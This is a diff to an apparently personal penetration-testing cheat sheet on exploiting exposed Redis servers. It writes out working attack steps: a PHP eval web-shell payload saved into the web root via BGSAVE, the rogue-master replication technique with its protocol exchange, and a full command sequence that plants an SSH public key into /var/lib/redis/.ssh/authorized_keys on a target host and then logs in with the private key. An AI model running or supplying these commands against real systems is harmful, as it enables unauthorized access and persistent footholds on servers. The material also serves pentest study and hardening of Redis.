@@ -19,6 +19,8 @@ i ```
 > [Cheat-Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets/DevOps%20Services/Redis)
 
 ### Exploitation
+> #### Authentication:
+> Brute force 
 1. **Easy**:
 > [!IMPORTANT] Must have rights to access the dir / Must know the web root dir
 ```redis 
@@ -33,12 +35,48 @@ SET PAYLOAD '<?php eval($_GET[0]);?>'
 BGSAVE
 ```
 2. **[Redis-rogue-server.py](https://github.com/n0b0dyCN/redis-rogue-server)** 
-> Sets a redis server which operates as a master and sends commands and writes to files to target with partial or total  
+> Sets a redis server which operates as a master and sends commands and writes to files to target with partial or total resynchronization 
+```redis
+rogue server
+1. PING - test if a connection is still alive
++PONG
+2. REPLCONF - exchange replication information between
+master and slave
++OK
+3. PSYNC/SYNC <replid> - synchronize slave state with
+the master (partial or full)
++CONTINUE <replid> 0
+[Source](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
+```
 >> [!IMPORTANT] Compile the .so on your machine
+
 3. **ssh** :
-> 
+> Generate a ssh public-private key pair on your pc: 
+`ssh-keygen -t rsa`
 
+> Write the public key to a file : 
+`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`
 
+> Import the file into redis : 
+`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`
+
+> Save the public key to the authorized_keys file on redis server:
+
+`root@Urahara:~# redis-cli -h 10.85.0.52
+10.85.0.52:6379> config set dir /var/lib/redis/.ssh
+OK
+10.85.0.52:6379> config set dbfilename "authorized_keys"
+OK
+10.85.0.52:6379> save
+OK`
+
+> Finally, you can ssh to the redis server with private key : 
+`ssh -i id_rsa redis@10.85.0.52 `
+
+### ** Tags:
+| OS | Vuln versions | Techniques |
+|  | --------------- | --------------- |
+| Windows, Linux | 4 - 5  | SSRF, SSH, Reverse-shell, Web-shell  |
  
 
    
